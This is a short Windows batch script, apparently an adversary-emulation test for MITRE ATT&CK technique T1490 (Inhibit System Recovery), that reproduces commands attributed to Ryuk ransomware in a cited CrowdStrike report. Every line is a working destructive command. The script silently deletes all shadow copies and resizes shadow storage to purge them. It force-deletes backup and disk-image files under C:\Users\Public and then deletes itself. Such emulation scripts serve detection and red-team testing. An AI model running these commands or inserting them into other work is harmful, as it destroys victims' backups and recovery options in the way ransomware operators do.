:: T1490 - Inhibit System Recovery
:: From source: https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ 

vssadmin Delete Shadows /all /quiet
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=unbounded

del /s /f /q C:\Users\Public\*.VHD C:\Users\Public\*.bac C:\Users\Public\*.bak C:\Users\Public\*.wbcat C:\Users\Public\*.bkf C:\Users\Public\Backup*.* C:\Users\Public\backup*.* C:\Users\Public\*.set C:\Users\Public\*.win C:\Users\Public\*.dsk
del %0
